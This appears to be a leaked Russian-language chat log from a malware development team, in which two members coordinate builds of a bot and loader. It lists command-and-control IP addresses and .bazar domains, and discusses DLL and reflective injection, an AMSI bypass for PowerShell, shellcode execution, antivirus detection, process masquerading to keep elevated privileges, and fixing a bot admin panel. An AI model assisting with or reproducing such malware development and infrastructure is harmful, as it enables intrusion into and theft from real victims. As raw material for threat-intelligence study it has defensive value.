[30.09.21 14:04:44] collin:		помню про это, надо подождать когда inject (self) режим определим как будет
[30.09.21 14:04:59] collin:		возможно там тоже таймаут не юзабельный
[30.09.21 14:05:35] royal:		Наблюдение такое еще. Когда ижект в программу консольную делаешь программу гуи падает программа консольная. А гуи в гуи все работает.
[30.09.21 14:06:06] royal:		В браузеры инжектится все OK например, а в cmd нет.
[30.09.21 14:06:06] collin:		инжект dll?
[30.09.21 14:06:13] royal:		Да.
[30.09.21 14:06:38] royal:		В svchost инжектится все OK, в explorer.exe, в блокнот и т.д.
[30.09.21 14:06:55] collin:		принял, уточню
[30.09.21 14:07:10] collin:		надо понять какие нагрузки будут разные или не принципиально
[30.09.21 14:12:33] royal:		Даже инжектится в SecurityHealthSystray.exe
[30.09.21 14:13:20] collin:		сделай сборку группа 35
[30.09.21 14:13:29] collin:		x64, regsvr32
[30.09.21 14:13:34] collin:		адреса и базары:
[30.09.21 14:13:41] collin:		```
адреса (домены) первого этапа
бот:
164.90.226.23
164.90.226.25
164.90.226.27
164.90.236.133

лоадер:
164.90.226.27
164.90.226.25
164.90.226.23
164.90.236.133

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[30.09.21 14:13:48] collin:		направь wild и мне продублируй
[30.09.21 14:50:43] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAlN6iXCQipueejUXmnOWKya8N0mGM6H3Bh/M5B9m+UWMz
smCmka8yalVSkxYUeukNJIWidJRPVhJA/OwpB4XRfN+4MVUfC3CCNZ/SQv+HN8bc
gt2fguXfGGw6aPn5ilJloZ1z1F24FZGf4eFiJAL8RWfFRv3T2G9c2cscYsKJzMMm
GdT0Wrj/mx7DN7k7d3c3NuY3mE+Mu4uhQ2eXAwtZfG6yUKgfrr7piMZy+m9Su27B
Fp1qHpmuw8rlwVducv9f4xeOtvRGLGsW15N8KjDQMKJqqTTi7D7T7lFi8oPmXdtE
mhjjOmJ8TDuqKG3yEOVpUixWMLhl6A/oHb/ipT9e93c7RufjeWxEL5pBHOiR341b
sxedsqmc2Hu7TuRlLBpenY+esacooceN4R9pZB9zZuBrPWwJo/Mgz6xGS/bz0xqH
6kuZmPuI1bA+VfAxGRXk1mi15JC5DpzZlJs55cYcbJ424PKj4p+CGG3KcmN+q2kt
BowVqP4HpBH2872tiTMPoT0JcabqhwyIRWCXE7uHkyBOZgGxPm3tRNu7QjBEHt2/
b3q2Z9KoFuMNRuuYk0dHB+nXrukL0Z4NRs5bY9Iobb5HHXoNmkMCfeVHoeXvX3Ze
cAjOwq6b3DYYx5jo9y1TXVPgn5tXYXCkFXx8rog6nTdhSQ4CYNulCxBcXPT6kPXS
wD4BHKcTKSCNihbmW10I8mbT+BPw0hD8LoXtzK05DoFaL7XbojIRrueqL5fKe/rB
P94RwYqFXiTxozoG4JihTmtecV3rR7ToM+kXEjmsmQ4QbyJTOKr33itAaTA3mtVC
NA0Eu6YBPpvpf6KHtB0ER5bZ8F9NgQaRS20/rdB82IT2EieIc5OCUiZPudeR8L45
1vR+ZBHMzA91KcZ5oz4JtO/asb7bLUw/kcJhhcGoJkPoyJgnRRVwsLnxAStYndlw
Re9ptFFJXvqEnTkAIUhjEsGsZbT7OS1z9+s2nZ451MdW02FnAp+RFtJtSZQjkcJG
V8w2awlWwxALLFQWr65a3w==
=qMsu
-----END PGP MESSAGE-----
[30.09.21 14:50:50] royal:		Один детект NOD 32.
[30.09.21 14:56:19] collin:		+
[01.10.21 07:56:54] collin:		привет!
[01.10.21 07:57:05] collin:		сделай сборку группа fat1
[01.10.21 07:57:32] collin:		x64, rundll32(GlobalOut)
[01.10.21 07:57:36] collin:		адреса и базары:
[01.10.21 07:57:46] collin:		```
адреса (домены) первого этапа
бот:
138.68.74.234
161.35.25.202
164.90.226.28
164.90.226.30

лоадер:
164.90.226.28
164.90.226.30
138.68.74.234
161.35.25.202

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[01.10.21 07:57:50] collin:		направь nick
[01.10.21 07:59:34] collin:		именно в исходнике сделай функцию GlobalOut, не StartW
[01.10.21 07:59:50] collin:		т.к. нагрузка может палиться в памяти после развертывания
[01.10.21 08:00:30] royal:		OK.
[01.10.21 12:09:23] royal:		Надо в сисифно теперь id процессов писать?
[01.10.21 12:10:14] royal:		Иначе как будут делать инъекцию dll.
[01.10.21 12:11:22] collin:		думаю да
[01.10.21 12:11:35] collin:		так выводи: id, имя процесса, архитектура
[01.10.21 12:11:55] royal:		OK.
[01.10.21 12:19:08] collin:		а ты знаком со сборкой с помощью CMakeLists.txt и CMakeRC?
[01.10.21 12:39:10] royal:		Я собираю Cmake версию загрузчика для компилятора GCC. CMakeRC не знаю что такое.
[01.10.21 12:53:02] collin:		```
Dn8krXn7mBSN7kNEg8kRSgeBXn8TNF
https://privatlab.com/s/v/dbDO8EqrxphpdbORoz4n
https://privatlab.com/s/d/dbDO8EqrxphpdbORoz4n/GpE3G#delete
```
[01.10.21 12:53:44] royal:		Все стерлось.
[01.10.21 12:53:53] collin:		```
Dn8krXn7mBSN7kNEg8kRSgeBXn8TNF
https://privatlab.com/s/v/dbDO8EqrxphpdbORoz4n
https://privatlab.com/s/d/dbDO8EqrxphpdbORoz4n/GpE3G#delete
```
[01.10.21 12:54:02] collin:		будь добр сделай одну задачу небольшую, БК отложи пока
[01.10.21 12:54:16] collin:		это вот решение следующей задачи:
[01.10.21 12:54:42] collin:		```
Программа должна состоять из двух модулей:
- основного .exe
- .dll с некоей логикой, к примеру, выводящей окно с текстом "Hello!"

При этом, .dll должна быть упакована в .exe и должна распаковываться и загружаться в тело процесса на этапе запуска.
ВАЖНО: сбрасывать .dll на диск и затем загружать LoadLibrary ЗАПРЕЩЕНО! .dll должна разворачиваться и настраиваться в памяти.

Результатом задания должен быть ОДИН файл .exe (кроме исходного кода).
```
[01.10.21 12:54:53] collin:		для кандидатов в новые кодеры к нам, вступительное задание так называемое
[01.10.21 12:55:05] collin:		нужно проверить соответствует ли его решение поставленной задачи
[01.10.21 12:55:38] collin:		у него там CMake, я с ним очень плохо знаком
[01.10.21 12:56:04] collin:		плюс используется дополнительный компонент
[01.10.21 12:56:08] collin:		```
Закинуть DLL в качестве ресурса к exe. Можно использовать средства проектов Visual Studio для добавления ресурсов, я применял кроссплатформенный CMakeRC 
https://github.com/vector-of-bool/cmrc 
```
[01.10.21 12:56:12] collin:		и еще библиотека WIL я так понял
[01.10.21 12:56:27] collin:		можешь вот это все собрать и проверить, работает ли так как задумано
[01.10.21 12:56:50] collin:		или сделать вывод что ничего не работает
[01.10.21 12:56:52] royal:		Сейчас посмотрю.
[01.10.21 12:58:51] royal:		Компилятором каким собирать по заданию?
[01.10.21 12:58:57] royal:		MSVC?
[01.10.21 13:00:34] collin:		а там нет жесткой привязки к компилятору?
[01.10.21 13:00:43] collin:		вроде опции в формате msvc, но и кланг упоминается
[01.10.21 13:01:52] royal:		У CMake нету привязки к компилятору, он указывается когда зарускаешь утилиту CMake чтобы она сформировала сценарий сборки или проект.
[01.10.21 13:02:10] royal:		На WIndows по умолчанию MSVC.
[01.10.21 13:02:23] collin:		давай на нем тогда попробуй
[01.10.21 13:08:23] royal:		Посмотри ка папка cmrc пустая?
[01.10.21 13:13:38] collin:		да
[01.10.21 13:13:54] royal:		А в проекте указана.
[01.10.21 13:14:14] royal:		Не доложил файлов или ошибка в файле проекта CMakeLists.txt
[01.10.21 13:14:41] collin:		походу он не прикрепил этот проект CMakeRC
[01.10.21 13:14:55] collin:		он же должен быть указан в CMakeLists если используется?
[01.10.21 13:14:55] royal:		Там должен быть как минимум файл CMakeLists.txt
[01.10.21 13:15:04] royal:		Да.
[01.10.21 13:15:15] collin:		то есть собрать нельзя с текущим набором?
[01.10.21 13:15:37] royal:		Я попробую собрать без этой подпапки.
[01.10.21 13:15:42] collin:		а на простанство имен wil:: не ругается?
[01.10.21 13:16:03] royal:		Ругается. Это я устанавливаю сейчас.
[01.10.21 13:16:11] collin:		ок
[01.10.21 13:16:19] royal:		Это обертка над WinApi.
[01.10.21 14:22:33] royal:		Что должно быть в итоге?
[01.10.21 14:24:16] collin:		dll-модуль в бинарном виде должен быть внутри экзешника, при запуске exe развертывает dll, та выводить MessageBox
[01.10.21 14:25:14] collin:		т.е. при запуске exe - должен выводится MessageBox
[01.10.21 14:28:07] royal:		А тот кто присла это говорит что все работает у него?
[01.10.21 14:28:38] collin:		да
[01.10.21 14:28:43] collin:		но он может врать/заблуждаться
[01.10.21 14:28:44] royal:		Я уже при запуске библиотеки чкерез rundll32 получаю ошибку.
[01.10.21 14:29:15] collin:		я тоже, но я так понял она будет прошиваться внутри экзешника
[01.10.21 14:29:19] collin:		при ее бесфайловом развертывании
[01.10.21 14:30:21] royal:		А погоди. Я опять не внисательно смотрю.
[01.10.21 14:30:22] collin:		это вариант рефлективной инъекции "либа сама себя настраивает" я так понял
[01.10.21 14:30:34] collin:		но я с такой техникой не работал, поэтому по коду сказать не могу однозначно
[01.10.21 14:30:47] royal:		Там же надо указывать pid процесса когда запускаешь ReflectiveInjector.exe
[01.10.21 14:31:07] collin:		нет, там этот кусок изменен
[01.10.21 14:31:28] royal:		Usage: ReflectiveInjector <process_id>
[01.10.21 14:31:35] collin:		там потом GetCurrentProcess идет через обертку wil
[01.10.21 14:31:47] royal:		Вот что выдает если без параметров запускаю ReflectiveInjector.exe
[01.10.21 14:31:53] collin:		аэто осталось видимо от проекта, который он за основу брал
[01.10.21 14:33:31] collin:		а экзешник собирается с dll внутри в виде ресурса?
[01.10.21 14:38:03] royal:		У меня Release не собирается memcpy не разрешенный внещний символ.
[01.10.21 14:38:15] collin:		)
[01.10.21 14:38:16] royal:		А Debug не работает как ты говоришь.
[01.10.21 14:38:18] collin:		у меня также было..
[01.10.21 14:38:58] royal:		Я полагаю что это из-за того что он линкует с WIL, а я не могу найти ее в виде библиотеки.
[01.10.21 14:39:21] royal:		WIL это заголовочные файлы только.
[01.10.21 14:39:30] collin:		это в dllке, же? там wild нету
[01.10.21 14:39:40] collin:		wil*
[01.10.21 14:39:54] collin:		короче я ее собрал добавив статическую либу с memcpy самописную
[01.10.21 14:40:01] collin:		и только под x64 собирается ведь?
[01.10.21 14:41:13] royal:		Значит он не доложил файлов.
[01.10.21 14:43:09] collin:		```
h7KFNr6bSBwhDcxolT6nEVSnh9lTNf
https://file.io/IjcBCb5y9Rl7
```
[01.10.21 14:43:21] collin:		вот с этой либой попробуй слинковать
[01.10.21 14:43:28] collin:		Release профиль
[01.10.21 14:43:48] royal:		Можно указать архитектуру в cmake тогда создасться решение под Win32
[01.10.21 14:43:56] collin:		вариант, может все-таки не msvc компилер
[01.10.21 14:44:02] royal:		По умолчанию x64.
[01.10.21 14:44:04] collin:		это у него такая фишка тянуть memcpy
[01.10.21 14:44:26] royal:		msvc, там у него флаги компилятора и линковщика msvc в проекте указаны.
[01.10.21 14:44:43] collin:		тогда не полный проект получается 100%
[01.10.21 14:45:49] royal:		Посмотри файл CmakeLists.txt в корневой папке проекта, там:
set(
	BASIC_COMPILE_OPTIONS
		/MP	# Multiprocessor compilation
		/W4 # Warnings level
		#/WX # Treat warnings as errors
)
set(
	RELEASE_COMPILE_OPTIONS
		/O2		# Max optimization level
		/Ob3	# Aggressive inlining
		/Oi     # Enable intrinsics
		/Ot     # Prefer fast code
		/Oy		# Omit frame pointers
)
[01.10.21 14:46:13] royal:		флаги для cl.exe
[01.10.21 14:56:49] royal:		Шифрует нагрузку?
[01.10.21 14:57:04] royal:		Размер секции .data равен размеру dll
[01.10.21 14:57:33] collin:		нет видимо как есть она там
[01.10.21 14:57:45] royal:		Нету MZ в начале.
[01.10.21 14:58:22] collin:		может тогда обфусцирует как-то
[01.10.21 14:58:39] collin:		через  CMakeRC?
[01.10.21 15:11:25] royal:		Не работает как должно получается.
[01.10.21 15:12:04] royal:		Собирается, запускаю окна никакого не вижу. Вижу вывод Usage: ReflectiveInjector <process_id>
[01.10.21 15:13:03] royal:		Пусть присылает проект с описанием как собирать. Потому что так по умолчанию если собирать не работает как должно.
[01.10.21 15:13:35] royal:		Или он напутал там. Если я вижу вывод Usage: ReflectiveInjector <process_id>, а его не должно быть ты говоришь.
[01.10.21 15:14:33] royal:		Ты понял как cmrc пользоваться?
[01.10.21 15:14:58] royal:		В папку cmrc скачай отсюда https://github.com/vector-of-bool/cmrc
[01.10.21 15:15:12] royal:		CMakeLists.txt
CMakeRC.cmake
[01.10.21 15:16:09] royal:		В файле CMakeLists.txt закомментируй все кроме "include(CMakeRC.cmake)"
[01.10.21 15:16:52] collin:		понятно ок
[01.10.21 15:17:49] collin:		все тогда, заканчивай с этим проектом
[01.10.21 15:18:12] collin:		может будет еще вариант исправленный потом
[01.11.21 07:39:02] collin:		привет!
[01.11.21 07:39:43] royal:		Да.
[01.11.21 07:41:17] royal:		Удаляет если только с таймаутом запуск.
[01.11.21 07:41:37] royal:		Если без него про файл забывает и не следит за ним.
[01.11.21 07:46:52] royal:		В админку заходит. Там баг. Нажимаю bots получаю exception  PHP Warning – yii\base\ErrorException
[01.11.21 07:47:09] royal:		Наверное потому что у меня там ботов нет.
[01.11.21 07:47:35] royal:		Нажимаю groups открывается вкладка без ошибок.
[01.11.21 10:24:57] royal:		Такая дата в запросе "Monday, 01 November 2021 10:23:32" подходит?
[01.11.21 11:30:40] royal:		Не работает команда Run dll.
[01.11.21 11:31:11] royal:		Даю команду, жму GO, а команда не появляется в списке и не приходит боту.
[01.11.21 11:31:32] royal:		Вместо нее 0 60 приходит.
[01.11.21 11:32:18] royal:		Все равно тделать сборку?
[01.11.21 11:32:35] royal:		Да rundll32
[01.11.21 11:33:25] royal:		Заработала.
[01.11.21 11:38:52] royal:		В общем команда rundll что то через раз отдается и появляется в списке команд бота. Могут быть проблемы у того кто будет пользоваться.
[01.11.21 11:40:33] royal:		Сам попробуй моему боту отдай команду на запуск dll. Бот 1a25650db9674df5125d8a536245d2b4.
[01.11.21 11:40:45] royal:		Несколько раз попробуй.
[01.11.21 11:42:29] royal:		Может от учетной записи зависит.
[01.11.21 11:42:49] royal:		Сейчас другой косяк пошел. Тормоза и 504 код.
[01.11.21 11:43:05] royal:		У бота.
[01.11.21 11:44:34] royal:		Я в черном списке опять?
[01.11.21 11:46:11] royal:		Первый адрес не работает 504, второй работает.
[01.11.21 11:47:28] royal:		504 Gateway Time-out
[01.11.21 12:26:09] royal:		Собираю. Я проверял работу команды.
[02.11.21 08:17:42] royal:		Привет. OTR.
[02.11.21 08:18:22] royal:		В команде бота 13 "Run Powershell" реализовать возможность отключения AMSI в процессе powershell.exe
Пример реализации прилагается.
Пример скрипта для тестирования (вызывает блокировку через AMSI) прилагается.

Тип реализации: отдельный режим (задается на стадии сборки), по умолчанию отключен.
[02.11.21 08:18:35] royal:		Пришли то что приложено должно быть.
[02.11.21 08:26:40] royal:		Еще зпметил что не правильно тспользуют новую команду rundll, например 	rundll regsvr32 60 ev5.dll DllRegisterServer
[02.11.21 08:27:02] royal:		Не используют regsvr32 silent палевно, окошко может вылизать.
[02.11.21 08:27:28] royal:		Пишут экспортную функцию, а это не нужно.
[02.11.21 10:46:29] royal:		Да.
[02.11.21 10:48:04] royal:		Осталась.
[02.11.21 10:56:43] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//ZVBS//JDmi8yFtQPC5H02i+Lc2uAwCyTduxirt1aJyhO
jzvDJqamBHp2qyoRVT332HKkpF3Z1lMGUfU0EdN6TBqf5D5bdmhYuWolYGaRoyMD
y+yepb2vmCNTEm2CE8kMjLlNmGEfU0l5SUZHprhZChKtJEspjdntmJc2ZempMRPr
UJ/+pQDlrWReVRRBUzR8Y6tGFv1cpDLHbdDvhPWrDv3+2SfaK+i7dkl9kZaog1hn
oQzjrJhni/WaP4OS4MaCvnHaFjvhXLtGExsu9dHGwBfM2cqJt0Kngq5X7oeUzI0Y
YyR9KL9ohEeBI2Oek1vOQacrDCsnRFKRC3srmFLgDbvIOPNjYVfOjdWYixIu1tcK
sFUAWGurV87dU1fBTGVRvb7uEL4hTxI/gcZTijIf4d11n0l+K15D2qXZJV31egK0
d6HFBSf+vDOUyDf1e6eP31pthC5SyRnNUPQdcGB/v7AbAU/lg0+wpR/hcA914v1A
Jv4rQ3nrIHnSxvjCdMq5zMgq5M0rhgftBYfkI8yGCVnEudRdxHIbDzILi8LaRC9M
slQ+F1IJwdWLYYJ1uCRNU9J6tMnJATssC/XiAL1M1siHssAoUgYwfynki2LzAici
Udf92gvhjJ7TkwIrX7kZJ5f5GzitazFgRBzesrEI8DFz4DMk1N21wQMmkUd7yG/S
rQEcPcjye1cE/tS9joWCBx6xTUFJ/vsast48l29GzaYodix7UMrz3Y59m3MAq+8+
GfBsN9MPkds7FjEzHxhuKIoRv97JVpXXaM0UIc9bJSaxDyp7eVScINKxnJpgiMUT
soNMD4rQeoKxcwOD1wjRH6R4EFdKsCVRC9RTlkt00xEBAp5m2DjaP6Fn9quVT1qz
HS9B3r434rX6ZSwBLplF5B+UDCvLc3J544xNE7VT
=vXcm
-----END PGP MESSAGE-----
[02.11.21 10:57:16] royal:		xor одним байтом шифрует. xorV2 может шифровать любым массивом байт (в том числе и одним).
[02.11.21 10:57:53] royal:		Бфйты в массивк надо писать как хекс.
[02.11.21 10:58:13] royal:		Там где 1 байт только может можно писать буквой.
[02.11.21 11:46:06] royal:		Проверял. И Wild проверял.
[02.11.21 11:49:58] royal:		Когда парсится нету PID или он не может быть из строки переведен в число. Вот что вижу по логам.
[02.11.21 11:50:29] royal:		11 0 60 testdll1_X64_new1.dll TestDllMainFunction
[02.11.21 11:50:43] royal:		Вот команда. Нету PID после timeout
[02.11.21 11:50:58] royal:		Вчера работало.
[02.11.21 11:51:34] royal:		Так как PID должен быть всегда, команда считается не веоной и не выполняется.
[02.11.21 11:52:10] royal:		точнее отбрасывается как не верная.
[02.11.21 11:52:26] royal:		Какой строковой?
[02.11.21 11:52:59] royal:		Такого быть не должно.
[02.11.21 11:53:30] royal:		Нигде не должно быть имени файла.
[02.11.21 11:53:58] royal:		Это уже давно обговорили с Alphonse и он убрал это. А теперь это вернулось.
[03.11.21 09:47:17] royal:		А через tor 502 Bad gateway
[03.11.21 09:47:41] royal:		Заработали с третьей попытки.
[03.11.21 09:49:17] royal:		То что ты мне выдал для сборки.
[03.11.21 09:49:55] royal:		Они периолически не работают, по крайней мере первый. С третьей попытки запрос прошел.
[03.11.21 15:14:18] royal:		Да.
[03.11.21 15:15:29] royal:		Вот сейчас запустил в родном для windows powershell тишина пока.
[03.11.21 15:15:59] royal:		До этого запускл в не родном powershell, там ошибка была, они не совместимы могут быть.
[03.11.21 15:16:12] royal:		В родном тишина, никакого вывода вообщзе.
[03.11.21 15:16:26] royal:		Может скачать не может.
[03.11.21 15:16:41] royal:		И до amsi дело не доходит.
[03.11.21 15:17:01] royal:		Как проверить что работает тогда?
[03.11.21 15:17:09] royal:		Какой процесс надо посмотреть?
[03.11.21 15:18:04] royal:		Надо включить защиту в реальном времени, у меня она выключена.
[03.11.21 15:18:29] royal:		Все равно как понять что скрипт отработал?
[03.11.21 15:18:47] royal:		Вывода никакого нет.
[03.11.21 15:19:20] royal:		Процесс какой нибудь должен появиться?
[03.11.21 15:19:53] royal:		В этом процессе такое подключение есть 116.202.251.52.superbit.host:443
[03.11.21 15:20:21] royal:		Значит работает получается.
[05.11.21 10:54:06] royal:		Посмотрел шелл код. Там классическое исключение 0xC0000005 ACCESS VIOLATION.
[05.11.21 10:54:42] royal:		Код приходит и превращается в массив байт без ошибок.
[05.11.21 10:54:53] royal:		После запуска этого шелл кода.
[05.11.21 11:11:00] royal:		Заменил virtualProtect(codeAddr, codeSize, PAGE_EXECUTE, &old) на virtualProtect(codeAddr, codeSize, PAGE_EXECUTE_READWRITE, &old)
[05.11.21 11:11:06] royal:		И заработал шелл код этот.
[05.11.21 11:11:34] royal:		Исключений не было поток запустился.
[05.11.21 11:12:42] royal:		Таким большим шелл кодом не возможно пользоваться, надо до плюса крутить в админке.
[05.11.21 11:13:08] royal:		Чтобы ответ на команду посмотреть.
[05.11.21 11:19:41] royal:		504 код опять начал приходить.
[05.11.21 11:26:35] royal:		Заработало.
[05.11.21 11:46:32] royal:		Я сломал админку. Попробуй дать команду шелл код боту 1a25650db9674df5125d8a536245d2b4. Шелл код возьми из предыдущей.
[05.11.21 11:50:02] royal:		Заработало. Раза с 10.
[05.11.21 11:50:17] royal:		Раз 10 давал команду шелл код, а она не появлялась в очереди.
[05.11.21 11:50:25] royal:		Админка.
[05.11.21 11:51:12] royal:		Там висит 1.
[05.11.21 11:51:31] royal:		А до этого 10 раз ставил безрезультатно.
[05.11.21 11:52:08] royal:		Такое периодически происходит с командой rund dll тоже.
[08.11.21 10:27:59] royal:		Привет.
[08.11.21 10:28:39] royal:		Принял.
[11.11.21 07:26:07] royal:		Передает и stdout и stderr.
[11.11.21 07:26:17] royal:		В msg
[11.11.21 07:27:07] royal:		Как в командной строке, все в одном месте.
[11.11.21 09:15:15] royal:		Я думаю нету stderr потому что строка из stdin заканчивается нулевым символом, шлется гораздо больше байт чем в админке пишется в команде.
[11.11.21 09:15:39] royal:		Если в выводе строка заканчивается нулевым символом то все что после не будет отображено.
[11.11.21 09:16:29] royal:		Я это уточню.
[11.11.21 09:17:10] royal:		Шлется 456 байт, а в админке всего одна строка пишется, в которой гораздо меньше 456 байт.
[11.11.21 09:22:22] royal:		Шлется все
Output: This is stdout test output dll data (start from TestDllMainFunction)
1234567890!@#$%^&*()
This is stdout test output dll data (start from TestDllMainFunction)
1234567890!@#$%^&*()This is stderr test output dll data (start from TestDllMainFunction)
!@#$%^&*()1234567890
Module started with command line:
rundll32.exe C:\Users\ivana\AppData\Local\Temp\1D97.dll,TestDllMainFunction
Module X64
Command line consist of 2 arguments
Argument #1: rundll32.exe
Argument #2: C:\Users\ivana\AppData\Local\Temp\1D97.dll,TestDllMainFunction
[11.11.21 09:22:48] royal:		Не экранируется ничего.
[11.11.21 09:22:58] royal:		Вот и обрезается в админке.
[11.11.21 09:27:15] royal:		Может у меня обрезаться в одном месте. Надо проверить.
[11.11.21 09:27:24] royal:		Когда перевожу в кодировку UTF-8
[11.11.21 09:34:58] royal:		У меня не обрезается, после перевода в utf-8
pid=20016
&msg=This is stdout test output dll data (start from TestDllMainFunction)
1234567890!@#$%^&*()This is stderr test output dll data (start from TestDllMainFunction)
!@#$%^&*()1234567890
Module started with command line:
rundll32.exe C:\Users\ivana\AppData\Local\Temp\E481.dll,TestDllMainFunction
Module X64
Command line consist of 2 arguments
Argument #1: rundll32.exe
Argument #2: C:\Users\ivana\AppData\Local\Temp\E481.dll,TestDllMainFunction
[11.11.21 09:52:43] royal:		В отладчике посмотрел по символьно, там \0 в том месте где обрезвается.
[11.11.21 09:53:01] royal:		()\0This - вот так
[11.11.21 09:53:40] royal:		Можно у себя нули заменять на пробелы или \r\n например.
[11.11.21 09:53:54] royal:		Перед отправкой отчета.
[11.11.21 09:54:28] royal:		Только если программа выводит бинари вопрос.
[11.11.21 09:56:07] royal:		А процентное кодирование она потянет?
[11.11.21 09:56:26] royal:		Как она отобразит конец строки?
[11.11.21 09:56:54] royal:		()%00 типа так?
[11.11.21 09:57:05] royal:		Или так ()
[11.11.21 10:04:25] royal:		А эта testdll получается выдает в stdout строки с нулем на конце.
[11.11.21 10:06:37] royal:		Я stdin и stdout воспринимаю как байты а не строки, вот и передаю все что записалось без изменений.
[11.11.21 10:08:22] royal:		Двоеточие проблемный символ тоже, я заметил.
[11.11.21 10:08:52] royal:		Искажает.
[11.11.21 10:09:12] royal:		msg:	This is stdout test output dll data (start from TestDllMainFunction) 1234567890!@#$%^
*():
[11.11.21 10:09:59] royal:		Значит &
[11.11.21 10:10:39] royal:		Пробел тоже проблемный?
[11.11.21 10:10:58] royal:		Что то не замечал.
[15.11.21 07:59:17] royal:		OK.
[17.11.21 07:26:13] collin:		привет!
[17.11.21 07:26:59] collin:		отр
[25.11.21 08:22:11] collin:		привет!
[25.11.21 08:29:32] royal:		Привет.
[25.11.21 08:29:48] collin:		про сборки в жабу написал тебе
[26.11.21 10:18:44] royal:		Привет. Пока не отлучился, дай мне пару адресов для тестирования.
[26.11.21 10:19:10] collin:		привет!
[26.11.21 10:19:15] collin:		162.33.177.217
162.33.177.229
162.33.178.243
162.33.179.166
[26.11.21 10:19:33] royal:		Это для бота и загрузчика?
[26.11.21 10:19:47] collin:		да оба интерфейса
[26.11.21 10:19:52] royal:		OK.
[26.11.21 10:20:48] royal:		Для новой адмики да?
[26.11.21 10:20:57] collin:		новая основная
[30.11.21 07:13:41] collin:		Привет!
[30.11.21 13:48:38] royal:		Сборки не понадобятся сегодня?
[30.11.21 13:55:25] royal:		Надо отойти.
[30.11.21 14:00:36] collin:		пока тишина
[30.11.21 14:00:45] collin:		отойди да
[30.11.21 14:01:20] royal:		OK.
[02.12.21 07:34:31] collin:		привет!
[07.12.21 10:06:46] collin:		Привет!
[07.12.21 10:07:18] royal:		Привет.
[07.12.21 10:08:19] collin:		сделай сборки:
[07.12.21 10:08:25] collin:		1) группа g11 - x64, generic
[07.12.21 10:08:41] collin:		2) группа 57 - x64, rundll32(gigi)
[07.12.21 10:08:47] collin:		```
адреса (домены) первого этапа
бот:
87.120.8.87
31.13.195.85
87.120.37.76
31.13.195.71

лоадер:
87.120.37.76
31.13.195.71
87.120.8.87
31.13.195.85

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[07.12.21 10:08:53] collin:		направь nick
[07.12.21 11:29:57] royal:		neo это nick?
[07.12.21 11:31:02] collin:		nick в тор-жабе page@
[09.12.21 10:02:28] collin:		Привет!
[10.12.21 08:19:31] royal:		Привет.
[10.12.21 08:19:41] royal:		Вопрос. Таск 593.
[10.12.21 08:20:22] royal:		В четвертом пункте указано что между запросами на адреса из исписка должна быть задержка 30-90 секунд на перврм шаге поиска.
[10.12.21 08:20:59] collin:		Привет!
[10.12.21 08:21:03] royal:		А на втором шаге и третьем должна быть задержка между запросами на адреса полученные из bazar?
[10.12.21 08:27:10] collin:		на 2 и 3 шаге - одна попытка коннекта к каждому резолвленному адресу, задержки между попытками нет.
[10.12.21 08:27:33] royal:		Там везде одна попытка.
[10.12.21 08:27:53] collin:		Если один и тот же адрес резолвится из нескольких базаров последовательно, например из domain1.bazar - делаем попытку, переходим к следующему базару domain2.bazar.
[10.12.21 08:28:21] royal:		Понятно.
[10.12.21 08:28:22] collin:		Если из domain2.bazar резолвится тот же самый адрес - делаем еще одну попытку коннекта к нему
[13.12.21 08:22:16] collin:		Привет!
[14.12.21 08:03:56] collin:		привет!
[14.12.21 08:04:26] collin:		сделай новую сборку - группа 16, x64, generic
[14.12.21 08:04:55] collin:		```
адреса (домены) первого этапа
бот:
185.183.98.39
194.15.112.35
94.140.112.185
147.189.143.13

лоадер:
94.140.112.185
147.189.143.13
185.183.98.39
194.15.112.35

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[14.12.21 08:04:59] collin:		направь odis
[14.12.21 08:08:18] collin:		2) сделай сборку группа 29, x64, generic
[14.12.21 08:08:20] collin:		адреса и базары те же
[14.12.21 08:08:24] collin:		направь wild
[14.12.21 09:00:56] collin:		3) еще сделай сборку группа 16 - x64, rundll32(ClearEmptyState)
[14.12.21 09:00:59] collin:		адреса и базары те же
[14.12.21 09:01:01] collin:		направь odis
[14.12.21 10:03:50] royal:		У тебя админка открывается?
[14.12.21 10:05:47] collin:		отвалилась
[14.12.21 10:06:27] royal:		Адреса поперлы 502 код и 12029 ошибка (Internet_cannot_connect)
[14.12.21 11:19:00] collin:		админку восстановили, работает
[14.12.21 12:10:14] collin:		сделай сборку группа g4
[14.12.21 12:10:20] collin:		x64, regsvr32
[14.12.21 12:10:24] collin:		```
адреса (домены) первого этапа
бот:
31.13.195.189
87.120.254.198
87.120.8.99
31.13.195.188

лоадер:
87.120.8.99
31.13.195.188
31.13.195.189
87.120.254.198

домены второго этапа, бот и лоадер:
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[14.12.21 12:10:37] collin:		направь wild
[15.12.21 11:13:58] royal:		По поводу таска когда запускается с повышенными правами загрузчик. Посмотрел у себя, у меня из закрепа запускается так же с повышенными правами. Ничего менять не требуется.
[15.12.21 11:15:19] royal:		Проверю еще с какими правами запускаются процессы команд, но думаю что так же как и родительский процесс с повышенными.
[15.12.21 11:15:35] collin:		хорошо если так
[15.12.21 11:15:49] collin:		заказчик просил проверить, сказал что-то не так якобы
[15.12.21 11:59:32] royal:		В общем когда маскируюсь под дочерний процесс браузера то действительно бот не с повышенными правами работает. А если сам запускаю например svchost и под него маскируюсь то с повышенными. Быстрое решение проверять с какими правами запущен загрузчи, если с повышенными то маскировка под svchost, если нет то под дочерний процесс браузера.
[15.12.21 12:01:22] collin:		то есть дочерний процесс браузера с админскими нельзя собрать?
[15.12.21 12:01:28] collin:		запустить*
[15.12.21 12:03:23] royal:		Это нужно изучить, скорей всего можно. Незря же в аргументах запуска процесса есть токен безопасности.
[15.12.21 12:03:40] royal:		Быстрое решение пока проверка как писал выше.
[15.12.21 12:05:07] collin:		но если браузер будет под админом - в любом случае маскировка уже хромает, т.к. это видно
[15.12.21 12:06:02] royal:		Да браузер под амином это странно.
[15.12.21 12:07:04] collin:		давай тогда первый вариант - так как ты написал
[15.12.21 12:07:27] collin:		но над запуском браузеров под админом все-таки поработай, попробуй этого достичь
[15.12.21 12:08:34] collin:		а еще обращал внимание когда запускаешься под svchost - процесс другого цвета
